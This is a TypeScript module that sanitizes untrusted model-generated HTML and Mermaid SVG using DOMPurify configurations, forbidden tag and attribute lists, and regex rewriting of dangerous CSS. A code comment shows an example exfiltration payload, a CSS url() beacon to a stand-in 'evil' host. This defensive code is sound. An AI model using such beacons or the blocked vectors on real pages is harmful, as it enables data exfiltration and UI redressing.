// HTML sanitization for any model- or CLI-produced markup rendered in an
// iframe via `srcDoc`. The model and CLI tools run in trusted contexts but
// their *output* is untrusted — a `generate_file` of a webpage, a scraped
// HTML snippet, or a terminal ```html block can all carry `<script>` tags.
// Even inside a `sandbox=""` iframe, inline scripts execute in that frame's
// origin and can fetch() external URLs (exfiltration) or touch the frame's
// own localStorage. DOMPurify strips scripts, event handlers, and other
// active content before the markup is ever handed to the iframe.
//
// One helper for every srcDoc site so the policy is consistent and so future
// tightening (e.g. allowing a known-safe tag subset) has a single home.
import DOMPurify, { type Config } from "dompurify";

// Allow presentation markup (SVG, MathML, tables, styles) but no scripting,
// no event handlers, no form submission, no external-resource loading that
// could beacon data out. `ALLOW_UNKNOWN_PROTOCOLS: false` keeps `javascript:`
// and `data:` URIs out of href/src. Inline `style` is allowed (never in
// FORBID_ATTR): the office renderers (docx/pptx/diagram) put ALL formatting
// in inline styles, and the preview iframes are `sandbox=""` so no scripts
// can run anyway.
const PURIFY_CONFIG: Config = {
  ALLOWED_ATTR: [
    "class",
    "id",
    "style",
    "width",
    "height",
    "viewBox",
    "preserveAspectRatio",
    "d",
    "fill",
    "stroke",
    "stroke-width",
    "cx",
    "cy",
    "r",
    "rx",
    "ry",
    "x",
    "y",
    "x1",
    "y1",
    "x2",
    "y2",
    "transform",
    "points",
    "href",
    "src",
    "alt",
    "title",
    "colspan",
    "rowspan",
    "target",
    "rel",
    "xmlns",
    "lang",
    "dir",
  ],
  FORBID_ATTR: ["onerror", "onload", "onclick", "onmouseover"],
  FORBID_TAGS: ["script", "iframe", "object", "embed", "form", "link", "meta"],
  ALLOW_DATA_ATTR: false,
  ALLOW_UNKNOWN_PROTOCOLS: false,
};

/** Sanitize untrusted HTML before it is assigned to an iframe `srcDoc`.
 *  Returns the cleaned markup. An empty/null input yields an empty string. */
export function sanitizeHtml(html: string | null | undefined): string {
  if (!html) return "";
  return DOMPurify.sanitize(html, PURIFY_CONFIG);
}

// Mermaid-SVG policy. Mermaid renders untrusted model output, and even with
// `securityLevel:"antiscript"` its `loose`-family modes pass label HTML
// through into `<foreignObject>` (multi-line flowchart labels need this, so
// we can't just drop foreignObject). USE_PROFILES keeps every SVG/MathML
// presentation tag and attribute intact — unlike the iframe policy's tight
// ALLOWED_ATTR list, which would strip half of mermaid's output — while
// DOMPurify still strips <script>, on* event handlers, and javascript:/data:
// URLs in href/xlink:href. foreignObject must be added explicitly (it is in
// neither DOMPurify profile) or every htmlLabel diagram breaks.
const SVG_PURIFY_CONFIG: Config = {
  USE_PROFILES: { svg: true, svgFilters: true, html: true, mathMl: true },
  ADD_TAGS: ["foreignObject"],
  // DOMPurify's default HTML_INTEGRATION_POINTS is only {annotation-xml}, so
  // without this it *force-removes* every XHTML element inside foreignObject
  // (children of a removed foreignObject get no KEEP_CONTENT rescue — it is in
  // DEFAULT_FORBID_CONTENTS). Mermaid's multi-line labels live exactly there.
  HTML_INTEGRATION_POINTS: { foreignobject: true },
  FORBID_TAGS: ["script", "iframe", "object", "embed", "form", "link", "meta"],
  ALLOW_DATA_ATTR: false,
  ALLOW_UNKNOWN_PROTOCOLS: false,
};

/** Sanitize an SVG string (e.g. mermaid.render output) before it is assigned
 *  to `dangerouslySetInnerHTML` in the main window. Preserves diagram
 *  markup/labels; strips scripting and event handlers. */
export function sanitizeSvg(svg: string | null | undefined): string {
  if (!svg) return "";
  const clean = DOMPurify.sanitize(svg, SVG_PURIFY_CONFIG);
  // A <style> element inside an SVG is NOT scoped to the SVG — it applies to
  // the whole document, and this output lands in the privileged main window.
  // Model-authored CSS (mermaid `%%{init: {"themeCSS": …}}%%` flows here)
  // must not reach the app's real stylesheet: @import/url() load remote
  // resources (beacon/exfil; CSP's `img-src https:` would allow them), and
  // position:fixed/absolute overlays can redress the entire UI. Mangle the
  // dangerous constructs instead of dropping the <style> element so the
  // diagram's own class rules (node/fill/stroke/font) keep working.
  // DOMPurify output is serialized from a parsed DOM, so a <style> element's
  // content is plain text and cannot itself contain "</style>" — the regex
  // below cannot run past the real element end.
  return clean
    .replace(
      STYLE_BLOCK_RE,
      (_m, open: string, css: string, close: string) =>
        `${open}${neutralizeMainDocCss(css)}${close}`,
    )
    // Inline style attributes on SVG nodes are a second path to the same
    // vectors (e.g. `style="fill: url(https://evil/?leak)"` beacons through
    // CSP's permissive img-src). Attribute values in DOMPurify's serialized
    // output are double-quoted with any inner quote escaped, so `[^"]*`
    // cannot overrun the attribute.
    .replace(
      STYLE_ATTR_RE,
      (_m, pre: string, val: string, post: string) =>
        `${pre}${neutralizeMainDocCss(val)}${post}`,
    );
}

const STYLE_BLOCK_RE = /(<style[^>]*>)([\s\S]*?)(<\/style>)/gi;
const STYLE_ATTR_RE = /(\sstyle\s*=\s*")([^"]*)(")/gi;

/// Neutralize the CSS constructs that only matter when a style block reaches
/// the MAIN document. Fragment references (`filter: url(#arrow)`) survive —
/// mermaid uses them for markers/filters; everything remote or
/// overlay-capable is mangled into an invalid property/function name so the
/// CSS parser drops exactly that declaration.
export function neutralizeMainDocCss(css: string): string {
  return css
    .replace(/@import[^;]*;?/gi, "/* removed: @import */")
    .replace(/@charset[^;]*;?/gi, "/* removed: @charset */")
    // `url(` whose argument is not a `#fragment` → invalid function.
    .replace(/\burl\(\s*(['"]?)\s*(?!#)/gi, "refused-url($1")
    .replace(/([;{\s"'])position\s*:/gi, "$1refused-position:")
    .replace(/\b(behavior|-moz-binding)\s*:/gi, "refused-$1:");
}
